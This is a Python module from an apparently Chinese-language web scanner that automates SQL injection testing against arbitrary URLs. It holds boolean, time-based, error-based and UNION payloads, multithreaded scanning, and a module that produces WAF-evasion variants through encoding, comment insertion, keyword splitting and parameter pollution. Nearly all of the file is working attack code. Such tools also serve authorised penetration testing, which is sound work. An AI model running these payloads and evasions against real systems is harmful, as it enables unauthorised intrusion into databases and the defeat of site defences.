"""Core SQL injection engines and injector classes."""

import base64
import random
import time
import urllib.parse
from concurrent.futures import ThreadPoolExecutor, as_completed
from threading import Lock
from urllib.parse import parse_qsl, urlencode, urlparse, urlunsplit

import requests

from .config import ADVANCED_SQL_PAYLOADS
from .network import request_with_retry
from .runtime import (
    print_debug,
    print_error,
    print_info,
    print_success,
    tagged_output,
    print_verbose,
    print_vulnerability,
)


args = None

_INJECTION_TYPE_LABELS = {
    "boolean": "布尔盲注",
    "time": "时间盲注",
    "error": "错误注入",
    "union": "联合查询",
}


def _injection_type_label(injection_type):
    return _INJECTION_TYPE_LABELS.get(str(injection_type).lower(), injection_type)


def find_mark_positions(string, substring):
    start = 0
    positions = []
    while True:
        start = string.find(substring, start)
        if start == -1:
            return positions
        positions.append(start)
        start += len(substring)

@tagged_output("SQL")
def advanced_sql_injection_test(url, headers=None, method='GET', data=None):
    global args
    vulnerabilities = []
    print_info("开始高级SQL注入检测")

    if headers is None:
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.108 Safari/537.36",
            "Cookie": args.cookie if args.cookie else ""
        }


    if method.upper() == 'GET' and '=' in url:
        positions = find_mark_positions(url, '=')
        for pos in positions:
            test_marks = ["'", '"']
            for mark in test_marks:
                status_list = []
                response_length = []
                test_urls = []


                for i in range(3):
                    test_url = url
                    test_url_list = list(test_url)
                    test_url_list.insert(pos + 1, mark * i)
                    test_url = ''.join(test_url_list)
                    test_urls.append(test_url)

                    try:
                        response = request_with_retry(test_url, headers, args.timeout, args.proxy, args.retries)
                        if response:
                            status_list.append(response.status_code)
                            response_length.append(len(response.text))
                        else:
                            status_list.append(0)
                            response_length.append(0)
                    except Exception as e:
                        status_list.append(0)
                        response_length.append(0)
                        if args.verbose:
                            print_debug("测试URL时请求失败")

                # 使用sqli-detector的判断逻辑
                vuln = analyze_sql_injection_response(url, mark, status_list, response_length, test_urls)
                if vuln:
                    vulnerabilities.append(vuln)

    # POST请求的SQL注入检测
    elif method.upper() == 'POST' and data and '=' in data:
        positions = find_mark_positions(data, '=')
        for pos in positions:
            test_marks = ["'", '"']
            for mark in test_marks:
                status_list = []
                response_length = []
                test_data_list = []

                # 测试0个、1个、2个引号
                for i in range(3):
                    test_data = data
                    test_data_list_chars = list(test_data)
                    test_data_list_chars.insert(pos + 1, mark * i)
                    test_data = ''.join(test_data_list_chars)
                    test_data_list.append(test_data)

                    try:
                        response = request_with_retry(url, headers, args.timeout, args.proxy, args.retries, 'POST', test_data)
                        if response:
                            status_list.append(response.status_code)
                            response_length.append(len(response.text))
                        else:
                            status_list.append(0)
                            response_length.append(0)
                    except Exception as e:
                        status_list.append(0)
                        response_length.append(0)
                        if args.verbose:
                            print_debug("POST请求失败")

                # 使用sqli-detector的判断逻辑
                vuln = analyze_sql_injection_response(url, mark, status_list, response_length, test_data_list, 'POST')
                if vuln:
                    vulnerabilities.append(vuln)

    return vulnerabilities

def _variance(values):
    if not values:
        return 0.0
    mean = sum(values) / len(values)
    return sum((value - mean) ** 2 for value in values) / len(values)


def analyze_sql_injection_response(url, mark, status_list, response_length, test_requests, method='GET'):
    try:

        if len(status_list) >= 3 and status_list[0] == 200 and status_list[1] != 200 and status_list[2] == 200:
            vuln = {
                "type": "SQL注入（状态码差异）",
                "url": url,
                "method": method,
                "test_mark": mark,
                "evidence": f"状态码模式: {status_list[0]} -> {status_list[1]} -> {status_list[2]}",
                "test_requests": test_requests,
                "risk_level": "高危",
                "detection_method": "响应差异分析"
            }
            print_vulnerability(vuln)
            return vuln


        if len(response_length) >= 3:

            # 正常响应应相对稳定，只有中间测试响应明显偏离时才作为候选。
            var_normal = _variance([response_length[0], response_length[2]])
            var_with_error = _variance([response_length[0], response_length[1]])
            var_error_normal = _variance([response_length[1], response_length[2]])


            if var_normal < var_with_error and var_error_normal > 0:

                max_diff = max(abs(response_length[1] - response_length[0]),
                             abs(response_length[1] - response_length[2]))

                if max_diff > 50:
                    vuln = {
                        "type": "SQL注入（响应长度差异）",
                        "url": url,
                        "method": method,
                        "test_mark": mark,
                        "evidence": f"响应长度: {response_length}, 最大差异: {max_diff}字符",
                        "test_requests": test_requests,
                        "risk_level": "中危",
                        "detection_method": "响应差异分析"
                    }
                    print_vulnerability(vuln)
                    return vuln

    except Exception as e:
        if args.verbose:
            print_debug(
                f"SQL响应分析失败（{type(e).__name__}）"
            )

    return None

class AdvancedSQLInjector:
    """高级SQL注入检测器 - 多线程架构和智能检测算法"""

    def __init__(self, url, threads=10, timeout=10, proxy=None, verbose=False,
                 injection_type="boolean", delay_threshold=5, level=1):
        self.url = url
        self.threads = threads
        self.timeout = timeout
        self.proxy = proxy
        self.verbose = verbose
        self.injection_type = injection_type.lower()
        self.delay_threshold = delay_threshold
        self.level = level

        self.request_count = 0
        self.success_count = 0
        self.error_count = 0
        self.request_lock = Lock()

        self.vulnerabilities = []
        self.detected_database = None
        self.detected_version = None

        self.session = requests.Session()
        if proxy:
            self.session.proxies = {'http': proxy, 'https': proxy}

        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive',
            'Upgrade-Insecure-Requests': '1'
        })

        self.baseline_response = None
        self.baseline_time = 0

    def send_request(self, payload, method='GET', data=None):
        with self.request_lock:
            self.request_count += 1

        try:

            if method.upper() == 'GET':
                if '{payload}' in self.url:
                    test_url = self.url.replace('{payload}', payload)
                else:
                    parsed_url = urlparse(self.url)
                    query_params = parse_qsl(parsed_url.query, keep_blank_values=True)
                    if query_params:
                        target_param = query_params[0][0]
                        updated_params = []
                        replaced = False
                        for name, value in query_params:
                            if name == target_param and not replaced:
                                updated_params.append((name, payload))
                                replaced = True
                            else:
                                updated_params.append((name, value))
                    else:
                        target_param = 'id'
                        updated_params = [(target_param, payload)]

                    test_url = urlunsplit((
                        parsed_url.scheme,
                        parsed_url.netloc,
                        parsed_url.path,
                        urlencode(updated_params, doseq=True),
                        parsed_url.fragment
                    ))
                start_time = time.time()
                response = self.session.get(test_url, timeout=self.timeout)
                end_time = time.time()
            else:
                test_data = data.replace('{payload}', payload) if data else f"id={payload}"
                start_time = time.time()
                response = self.session.post(self.url, data=test_data, timeout=self.timeout)
                end_time = time.time()

            response_time = end_time - start_time

            with self.request_lock:
                self.success_count += 1

            return {
                'status_code': response.status_code,
                'content': response.text,
                'response_time': response_time,
                'headers': dict(response.headers),
                'url': response.url
            }

        except Exception as e:
            with self.request_lock:
                self.error_count += 1

            if self.verbose:
                print_debug(f"请求失败（{type(e).__name__}）")

            return {
                'status_code': 0,
                'content': '',
                'response_time': 0,
                'headers': {},
                'url': self.url,
                'error': str(e)
            }

    def get_baseline_response(self):
        """获取基准响应"""
        print_verbose("正在获取基准响应")
        self.baseline_response = self.send_request("1")
        self.baseline_time = self.baseline_response['response_time']

        if self.baseline_response['status_code'] == 0:
            print_error("无法获取基准响应，请检查目标URL")
            return False

        print_verbose(
            "基准响应已获取"
            f"（HTTP {self.baseline_response['status_code']}，"
            f"{self.baseline_time:.2f}秒）"
        )
        return True

    def test_boolean_injection(self, payload_true, payload_false):
        """测试布尔盲注"""
        response_true = self.send_request(payload_true)
        response_false = self.send_request(payload_false)

        if (response_true['status_code'] == 200 and response_false['status_code'] == 200):
            len_diff = abs(len(response_true['content']) - len(response_false['content']))

            similarity = self.calculate_similarity(response_true['content'], response_false['content'])

            if len_diff > 10 or similarity < 0.95:
                return {
                    'type': 'SQL注入（布尔盲注）',
                    'url': self.url,
                    'payload_true': payload_true,
                    'payload_false': payload_false,
                    'evidence': f'响应长度差异: {len_diff}, 相似度: {similarity:.2f}',
                    'risk_level': '高危',
                    'detection_method': '布尔盲注检测'
                }

        return None

    def test_time_injection(self, payload):
        """测试时间盲注"""
        response = self.send_request(payload)

        if response['response_time'] > self.baseline_time + self.delay_threshold:
            return {
                'type': 'SQL注入（时间盲注）',
                'url': self.url,
                'payload': payload,
                'evidence': f'响应时间: {response["response_time"]:.2f}s (基准: {self.baseline_time:.2f}s)',
                'risk_level': '高危',
                'detection_method': '时间盲注检测'
            }

        return None

    def test_error_injection(self, payload):
        response = self.send_request(payload)


        error_keywords = [
            'mysql', 'sql syntax', 'postgresql', 'oracle', 'sqlite',
            'odbc', 'jdbc', 'error in your sql syntax', 'quoted string not properly terminated',
            'unclosed quotation mark', 'syntax error', 'mysql_fetch_array',
            'pg_query', 'ora-', 'sqlite3', 'sqlstate'
        ]

        content_lower = response['content'].lower()
        for keyword in error_keywords:
            if keyword in content_lower:
                return {
                    'type': 'SQL注入（错误注入）',
                    'url': self.url,
                    'payload': payload,
                    'evidence': f'检测到数据库错误关键词: {keyword}',
                    'risk_level': '高危',
                    'detection_method': '错误注入检测'
                }

        return None

    def test_union_injection(self, payload):
        response = self.send_request(payload)


        version_keywords = [
            'mysql', 'postgresql', 'microsoft sql server', 'oracle',
            'sqlite', 'mariadb', 'version'
        ]

        content_lower = response['content'].lower()
        for keyword in version_keywords:
            if keyword in content_lower and keyword not in self.baseline_response['content'].lower():
                return {
                    'type': 'SQL注入（联合查询）',
                    'url': self.url,
                    'payload': payload,
                    'evidence': f'检测到数据库信息: {keyword}',
                    'risk_level': '高危',
                    'detection_method': '联合查询注入检测'
                }

        return None

    def calculate_similarity(self, str1, str2):
        """计算两个字符串的相似度"""
        if not str1 or not str2:
            return 0.0

        s1 = str1[:1000]  # 只比较前1000个字符
        s2 = str2[:1000]

        common = 0
        for i in range(min(len(s1), len(s2))):
            if s1[i] == s2[i]:
                common += 1

        return common / max(len(s1), len(s2))

    @tagged_output("SQL")
    def run_detection(self):
        """运行SQL注入检测"""
        print_verbose(
            f"开始高级SQL检测（{_injection_type_label(self.injection_type)}）"
        )

        if not self.get_baseline_response():
            return []

        if self.injection_type == "boolean":
            payloads = [
                ("1' AND 1=1-- -", "1' AND 1=2-- -"),
                ("1' OR 1=1-- -", "1' OR 1=2-- -"),
                ("1' AND 'a'='a'-- -", "1' AND 'a'='b'-- -")
            ]

            for payload_true, payload_false in payloads:
                vuln = self.test_boolean_injection(payload_true, payload_false)
                if vuln:
                    self.vulnerabilities.append(vuln)
                    print_vulnerability(vuln)

        elif self.injection_type == "time":
            time_payloads = [
                f"1' AND (SELECT SLEEP({self.delay_threshold}))-- -",
                f"1' AND (SELECT pg_sleep({self.delay_threshold}))-- -",
                f"1' AND WAITFOR DELAY '0:0:{self.delay_threshold}'-- -"
            ]

            for payload in time_payloads:
                vuln = self.test_time_injection(payload)
                if vuln:
                    self.vulnerabilities.append(vuln)
                    print_vulnerability(vuln)

        elif self.injection_type == "error":
            error_payloads = ADVANCED_SQL_PAYLOADS[:10]

            for payload in error_payloads:
                vuln = self.test_error_injection(payload)
                if vuln:
                    self.vulnerabilities.append(vuln)
                    print_vulnerability(vuln)

        elif self.injection_type == "union":
            union_payloads = [
                "1' UNION SELECT @@version-- -",
                "1' UNION SELECT NULL,@@version,NULL-- -",
                "1' UNION SELECT 1,2,3,4,5-- -"
            ]

            for payload in union_payloads:
                vuln = self.test_union_injection(payload)
                if vuln:
                    self.vulnerabilities.append(vuln)
                    print_vulnerability(vuln)


        print_verbose(
            "检测完成："
            f"共请求{self.request_count}次，"
            f"成功{self.success_count}次，"
            f"失败{self.error_count}次"
        )
        print_verbose(f"发现漏洞：{len(self.vulnerabilities)}个")

        return self.vulnerabilities

class WAFBypassModule:

    def __init__(self):
        self.bypass_techniques = {
            'encoding': self.encoding_bypass,
            'comment': self.comment_bypass,
            'case': self.case_bypass,
            'whitespace': self.whitespace_bypass,
            'union_bypass': self.union_bypass,
            'function_bypass': self.function_bypass,
            'protocol_bypass': self.protocol_bypass,
            'advanced_encoding': self.advanced_encoding_bypass,
            'keyword_bypass': self.keyword_bypass,
            'time_bypass': self.time_bypass
        }

    def encoding_bypass(self, payload):
        bypassed = []

        # URL编码
        bypassed.append(urllib.parse.quote(payload))

        # 双重URL编码
        bypassed.append(urllib.parse.quote(urllib.parse.quote(payload)))

        # 十六进制编码
        hex_payload = ''.join([f'%{ord(c):02x}' for c in payload])
        bypassed.append(hex_payload)

        # Unicode编码
        unicode_payload = ''.join([f'\\u{ord(c):04x}' for c in payload])
        bypassed.append(unicode_payload)

        # HTML实体编码
        html_payload = ''.join([f'&#{ord(c)};' for c in payload])
        bypassed.append(html_payload)

        # 混合编码
        mixed_payload = ''
        for i, c in enumerate(payload):
            if i % 3 == 0:
                mixed_payload += f'%{ord(c):02x}'
            elif i % 3 == 1:
                mixed_payload += f'&#{ord(c)};'
            else:
                mixed_payload += c
        bypassed.append(mixed_payload)

        return bypassed

    def comment_bypass(self, payload):
        """注释绕过"""
        bypassed = []

        # MySQL注释
        bypassed.append(payload.replace(' ', '/**/'))
        bypassed.append(payload.replace('=', '/**/=/**/'))
        bypassed.append(payload.replace('AND', '/*!50000AND*/'))
        bypassed.append(payload.replace('OR', '/*!50000OR*/'))

        # 内联注释
        bypassed.append(payload.replace('SELECT', '/*!12345SELECT*/'))
        bypassed.append(payload.replace('UNION', '/*!12345UNION*/'))

        return bypassed

    def case_bypass(self, payload):
        """大小写绕过"""
        bypassed = []

        # 随机大小写
        import random
        random_case = ''.join([c.upper() if random.choice([True, False]) else c.lower() for c in payload])
        bypassed.append(random_case)

        # 全大写
        bypassed.append(payload.upper())

        # 交替大小写
        alternating = ''.join([c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(payload)])
        bypassed.append(alternating)

        return bypassed

    def whitespace_bypass(self, payload):
        """空白字符绕过"""
        bypassed = []

        # 制表符替换
        bypassed.append(payload.replace(' ', '\t'))


        bypassed.append(payload.replace(' ', '\n'))


        bypassed.append(payload.replace(' ', '\t\n\r'))


        bypassed.append(payload.replace(' ', ''))

        return bypassed

    def union_bypass(self, payload):
        bypassed = []

        if 'UNION' in payload.upper():

            bypassed.append(payload.replace('UNION', 'UNION ALL'))
            bypassed.append(payload.replace('UNION', 'UNION DISTINCT'))
            bypassed.append(payload.replace('UNION', '/*!50000UNION*/'))
            bypassed.append(payload.replace('UNION', 'UNION/**/ALL'))


            if 'NULL' in payload.upper():
                bypassed.append(payload.replace('NULL', '0x00'))
                bypassed.append(payload.replace('NULL', 'CHAR(0)'))

        return bypassed

    def advanced_encoding_bypass(self, payload):
        """高级编码绕过"""
        bypassed = []

        # Base64编码
        import base64
        try:
            b64_payload = base64.b64encode(payload.encode()).decode()
            bypassed.append(f"CONVERT(FROM_BASE64('{b64_payload}'), CHAR)")
        except:
            pass

        # 八进制编码
        oct_payload = ''.join([f'\\{oct(ord(c))[2:]}' for c in payload])
        bypassed.append(oct_payload)

        # 混合大小写十六进制
        hex_mixed = ''.join([f'%{ord(c):02X}' if i % 2 == 0 else f'%{ord(c):02x}' for i, c in enumerate(payload)])
        bypassed.append(hex_mixed)

        return bypassed

    def function_bypass(self, payload):
        """函数绕过"""
        bypassed = []

        # CHAR函数绕过
        if "'" in payload:
            char_payload = payload.replace("'", "CHAR(39)")
            bypassed.append(char_payload)

        # CONCAT函数绕过
        if 'UNION' in payload.upper():
            concat_payload = payload.replace('UNION', 'CONCAT(CHAR(85),CHAR(78),CHAR(73),CHAR(79),CHAR(78))')
            bypassed.append(concat_payload)

        # HEX函数绕过
        if 'SELECT' in payload.upper():
            hex_select = payload.replace('SELECT', 'UNHEX(HEX(SELECT))')
            bypassed.append(hex_select)

        # 数学函数绕过
        if '1=1' in payload:
            math_payload = payload.replace('1=1', 'POW(1,1)=POW(1,1)')
            bypassed.append(math_payload)
            bypassed.append(payload.replace('1=1', 'SQRT(1)=SQRT(1)'))

        return bypassed

    def protocol_bypass(self, payload):
        """协议层绕过"""
        bypassed = []

        # HTTP参数污染
        if '=' in payload:
            hpp_payload = payload.replace('=', '=&id=')
            bypassed.append(hpp_payload)

        # 多重编码组合
        encoded = urllib.parse.quote(payload)
        double_encoded = urllib.parse.quote(encoded)
        bypassed.append(double_encoded)

        # 分块传输绕过
        chunked_payload = '\r\n'.join([payload[i:i+2] for i in range(0, len(payload), 2)])
        bypassed.append(chunked_payload)

        return bypassed

    def keyword_bypass(self, payload):
        """关键词绕过"""
        bypassed = []

        # 同义词替换
        keyword_replacements = {
            'SELECT': ['SELSELECTECT', 'SEL/**/ECT', 'S%45LECT'],
            'UNION': ['UNI/**/ON', 'UN%49ON', 'UNUNIONION'],
            'WHERE': ['WH/**/ERE', 'WH%45RE', 'WHWHEREERE'],
            'AND': ['AN/**/D', 'A%4ED', 'ANANDD'],
            'OR': ['O/**/R', '%4FR', 'OORR']
        }

        for keyword, replacements in keyword_replacements.items():
            if keyword in payload.upper():
                for replacement in replacements:
                    bypassed.append(payload.upper().replace(keyword, replacement))

        # 反向字符串
        if 'SELECT' in payload.upper():
            bypassed.append(payload.replace('SELECT', 'REVERSE(REVERSE(SELECT))'))

        return bypassed

    def time_bypass(self, payload):
        """时间延迟绕过"""
        bypassed = []

        # 添加延迟函数
        time_functions = [
            'SLEEP(0.1)',
            'BENCHMARK(1000,MD5(1))',
            'WAITFOR DELAY \'00:00:01\'',
            'pg_sleep(0.1)'
        ]

        for time_func in time_functions:
            if 'AND' in payload.upper():
                time_payload = payload.replace('AND', f'AND {time_func} AND')
                bypassed.append(time_payload)

        return bypassed

    def apply_bypass(self, payload, technique='all'):
        if technique == 'all':
            bypassed_payloads = []
            for tech_name, tech_func in self.bypass_techniques.items():
                try:
                    bypassed_payloads.extend(tech_func(payload))
                except Exception as e:
                    continue
            return bypassed_payloads
        elif technique in self.bypass_techniques:
            try:
                return self.bypass_techniques[technique](payload)
            except Exception as e:
                return [payload]
        else:
            return [payload]

    def get_advanced_payloads(self, base_payload):
        """获取高级绕过载荷"""
        advanced_payloads = []

        # 组合多种绕过技术
        encoded = self.encoding_bypass(base_payload)
        for enc_payload in encoded[:3]:  # 只取前3个编码结果
            advanced_payloads.extend(self.comment_bypass(enc_payload)[:2])
            advanced_payloads.extend(self.case_bypass(enc_payload)[:2])

        # 添加函数绕过
        advanced_payloads.extend(self.function_bypass(base_payload))

        # 添加关键词绕过
        advanced_payloads.extend(self.keyword_bypass(base_payload))

        return list(set(advanced_payloads))

class ThreadedSQLInjector:

    def __init__(self, urls, max_workers=10, timeout=10, proxy=None):
        self.urls = urls if isinstance(urls, list) else [urls]
        self.max_workers = max_workers
        self.timeout = timeout
        self.proxy = proxy
        self.results = []
        self.waf_bypass = WAFBypassModule()

    @tagged_output("SQL")
    def test_single_url(self, url, injection_type="boolean"):
        """测试单个URL"""
        try:
            injector = AdvancedSQLInjector(
                url=url,
                timeout=self.timeout,
                proxy=self.proxy,
                injection_type=injection_type
            )

            vulnerabilities = injector.run_detection()

            # 如果发现漏洞，尝试WAF绕过
            if vulnerabilities:
                print_verbose(f"在 {url} 发现漏洞，正在测试WAF绕过")

                # 测试基本载荷的WAF绕过
                test_payload = "1' OR 1=1-- -"
                bypassed_payloads = self.waf_bypass.apply_bypass(test_payload)

                for bypass_payload in bypassed_payloads[:5]:  # 只测试前5个绕过载荷
                    bypass_injector = AdvancedSQLInjector(
                        url=url,
                        timeout=self.timeout,
                        proxy=self.proxy,
                        injection_type="error"
                    )

                    bypass_result = bypass_injector.test_error_injection(bypass_payload)
                    if bypass_result:
                        bypass_result['bypass_technique'] = 'WAF绕过'
                        vulnerabilities.append(bypass_result)

            return {
                'url': url,
                'vulnerabilities': vulnerabilities,
                'status': 'completed'
            }

        except Exception as e:
            return {
                'url': url,
                'vulnerabilities': [],
                'status': 'error',
                'error': str(e)
            }

    @tagged_output("SQL")
    def run_threaded_scan(self, injection_types=["boolean", "time", "error", "union"]):
        """运行多线程扫描"""
        print_verbose(
            "开始多线程SQL扫描："
            f"{len(self.urls)}个目标，{self.max_workers}个线程"
        )

        all_tasks = []
        for url in self.urls:
            for injection_type in injection_types:
                all_tasks.append((url, injection_type))

        with ThreadPoolExecutor(max_workers=self.max_workers) as executor:

            future_to_task = {
                executor.submit(self.test_single_url, url, injection_type): (url, injection_type)
                for url, injection_type in all_tasks
            }


            for future in as_completed(future_to_task):
                url, injection_type = future_to_task[future]
                try:
                    result = future.result()
                    if result['vulnerabilities']:
                        self.results.append(result)
                        print_verbose(
                            f"已确认漏洞：{url}"
                            f"（{_injection_type_label(injection_type)}）"
                        )
                    else:
                        print_verbose(
                            f"未发现漏洞：{url}"
                            f"（{_injection_type_label(injection_type)}）"
                        )

                except Exception as e:
                    print_error(
                        f"扫描失败：{url}"
                        f"（{_injection_type_label(injection_type)}）"
                        f" - {type(e).__name__}"
                    )

        print_verbose(
            f"多线程扫描完成：{len(self.results)}个目标存在漏洞"
        )
        return self.results
